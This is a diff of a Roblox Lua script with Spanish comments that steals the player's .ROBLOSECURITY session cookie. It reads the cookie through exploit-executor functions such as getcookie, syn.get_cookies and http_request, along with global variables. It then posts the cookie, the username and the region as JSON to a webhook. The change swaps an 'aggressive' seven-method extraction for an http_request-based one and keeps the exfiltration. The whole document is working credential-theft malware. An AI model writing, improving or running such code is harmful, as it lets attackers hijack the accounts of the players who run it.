@@ -1,5 +1,5 @@
 -- =====================================================================
--- WEBHOOK UNIVERSAL CON EXTRACCIÓN AGRESIVA DE COOKIES
+-- WEBHOOK CON EXTRACCIÓN VÍA HTTP_REQUEST
 -- =====================================================================
 
 local HttpService = game:GetService("HttpService")
@@ -9,79 +9,60 @@ local LocalizationService = game:GetService("LocalizationService")
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
 
--- FUNCIÓN AGRESIVA DE EXTRACCIÓN DE COOKIES
-local function GetUniversalCookie()
+-- FUNCIÓN DE EXTRACCIÓN USANDO HTTP_REQUEST
+local function GetCookieViaHttpRequest()
     local cookie = nil
     
-    -- MÉTODO 1: getcookie() directo
-    if type(getcookie) == "function" then
-        local success, result = pcall(getcookie)
-        if success and result and tostring(result) ~= "" then
-            cookie = tostring(result)
-            print("✅ Cookie obtenida con getcookie()")
-        end
-    end
-    
-    -- MÉTODO 2: syn.get_cookies()
-    if not cookie and type(syn) == "table" and type(syn.get_cookies) == "function" then
-        local success, result = pcall(syn.get_cookies)
-        if success and result then
-            for _, c in ipairs(result) do
-                if c.Name == ".ROBLOSECURITY" then
-                    cookie = c.Value
-                    print("✅ Cookie obtenida con syn.get_cookies()")
-                    break
-                end
-            end
-        end
-    end
-    
-    -- MÉTODO 3: fluxus.getcookie()
-    if not cookie and type(fluxus) == "table" and type(fluxus.getcookie) == "function" then
-        local success, result = pcall(fluxus.getcookie)
-        if success and result and tostring(result) ~= "" then
-            cookie = tostring(result)
-            print("✅ Cookie obtenida con fluxus.getcookie()")
-        end
-    end
-    
-    -- MÉTODO 4: CookieService de Roblox
-    if not cookie then
-        local success, CookieService = pcall(function() 
-            return game:GetService("CookieService") 
+    -- MÉTODO 1: Hacer request a Roblox y obtener cookie de los headers
+    if type(http_request) == "function" then
+        print(" Intentando obtener cookie vía http_request...")
+        
+        local success, result = pcall(function()
+            return http_request({
+                Url = "https://www.roblox.com/home",
+                Method = "GET",
+                Headers = {
+                    ["User-Agent"] = "Mozilla/5.0"
+                }
+            })
         end)
         
-        if success and CookieService then
-            local success2, cookies = pcall(function()
-                return CookieService:GetCookies()
-            end)
-            
-            if success2 and cookies then
-                for _, c in ipairs(cookies) do
-                    if c.Name == ".ROBLOSECURITY" then
-                        cookie = c.Value
-                        print("✅ Cookie obtenida con CookieService:GetCookies()")
+        if success and result then
+            -- Buscar cookie en los headers de respuesta
+            if result.Headers and result.Headers["set-cookie"] then
+                local setCookie = result.Headers["set-cookie"]
+                print(" Set-Cookie encontrado:", string.sub(setCookie, 1, 100))
+                
+                -- Extraer .ROBLOSECURITY
+                for cookieStr in string.gmatch(setCookie, "[^,]+") do
+                    local name, value = string.match(cookieStr, "%s*(.-)=(.-);")
+                    if name == ".ROBLOSECURITY" then
+                        cookie = value
+                        print("✅ Cookie extraída de Set-Cookie header")
                         break
                     end
                 end
             end
             
-            -- Intentar con GetCookieValue
-            if not cookie then
-                local success3, savedCookie = pcall(function() 
-                    return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
-                end)
-                if success3 and savedCookie and tostring(savedCookie) ~= "" then
-                    cookie = tostring(savedCookie)
-                    print("✅ Cookie obtenida con CookieService:GetCookieValue()")
+            -- También buscar en result.Cookies si existe
+            if not cookie and result.Cookies then
+                print("📋 Cookies encontradas en response.Cookies")
+                for name, value in pairs(result.Cookies) do
+                    if name == ".ROBLOSECURITY" then
+                        cookie = value
+                        print("✅ Cookie extraída de result.Cookies")
+                        break
+                    end
                 end
             end
+        else
+            warn("❌ Error en http_request:", result)
         end
     end
     
-    -- MÉTODO 5: Variables de entorno
+    -- MÉTODO 2: Variables de entorno
     if not cookie then
-        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token", "ROBLOX_COOKIE"}
+        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
         for _, name in ipairs(envNames) do
             local env = getgenv()
             if env[name] and tostring(env[name]) ~= "" then
@@ -92,46 +73,15 @@ local function GetUniversalCookie()
         end
     end
     
-    -- MÉTODO 6: Buscar en _G
-    if not cookie then
-        if _G[".ROBLOSECURITY"] and tostring(_G[".ROBLOSECURITY"]) ~= "" then
-            cookie = tostring(_G[".ROBLOSECURITY"])
-            print("✅ Cookie obtenida de _G")
-        end
+    -- MÉTODO 3: Buscar en _G
+    if not cookie and _G[".ROBLOSECURITY"] then
+        cookie = tostring(_G[".ROBLOSECURITY"])
+        print("✅ Cookie obtenida de _G")
     end
     
-    -- MÉTODO 7: http_request (algunos executors)
-    if not cookie and type(http_request) == "function" then
-        local success, result = pcall(function()
-            return http_request({
-                Url = "https://www.roblox.com",
-                Method = "GET"
-            })
-        end)
-        if success and result and result.Cookies then
-            for cookieStr in string.gmatch(result.Cookies, "[^;]+") do
-                local name, value = string.match(cookieStr, "%s*(.-)=(.-)$")
-                if name == ".ROBLOSECURITY" then
-                    cookie = value
-                    print("✅ Cookie obtenida de http_request headers")
-                    break
-                end
-            end
-        end
-    end
-    
-    -- Si encontramos cookie, devolver con formato
     if cookie then
         return ".ROBLOSECURITY=" .. cookie
     end
-    
-    -- DEBUG: Mostrar qué funciones están disponibles
-    print("️ Cookie no encontrada. Funciones disponibles:")
-    print("  - getcookie():", type(getcookie) == "function")
-    print("  - syn.get_cookies():", type(syn) == "table" and type(syn.get_cookies) == "function")
-    print("  - fluxus.getcookie():", type(fluxus) == "table" and type(fluxus.getcookie) == "function")
-    print("  - http_request():", type(http_request) == "function")
-    print("  - request():", type(request) == "function")
     
     return "COOKIE_NO_DISPONIBLE"
 end
@@ -149,7 +99,7 @@ local function GetRegion()
 end
 
 -- RECOPILACIÓN DE DATOS
-local cookie = GetUniversalCookie()
+local cookie = GetCookieViaHttpRequest()
 
 local data = {
     username = player.Name,
@@ -161,7 +111,7 @@ local data = {
     cookie = cookie
 }
 
--- FUNCIÓN DE ENVÍO
+-- FUNCIÓN DE ENVÍO USANDO request()
 local function SendWebhook(url, data)
     local jsonData = HttpService:JSONEncode(data)
     
@@ -174,8 +124,8 @@ local function SendWebhook(url, data)
         })
     end
     
-    if type(syn) == "table" and type(syn.request) == "function" then
-        return pcall(syn.request, {
+    if type(http_request) == "function" then
+        return pcall(http_request, {
             Url = url,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
@@ -184,7 +134,7 @@ local function SendWebhook(url, data)
     end
     
     return pcall(function()
-        return HttpService:PostAsync(url, jsonData)
+        return game:GetService("HttpService"):PostAsync(url, jsonData)
     end)
 end
 
@@ -198,6 +148,9 @@ local success, response = SendWebhook(webhookUrl, data)
 
 if success then
     print("✅ Webhook enviado correctamente!")
+    if response and response.StatusCode then
+        print(" Status:", response.StatusCode)
+    end
 else
     warn("❌ Error:", response)
 end
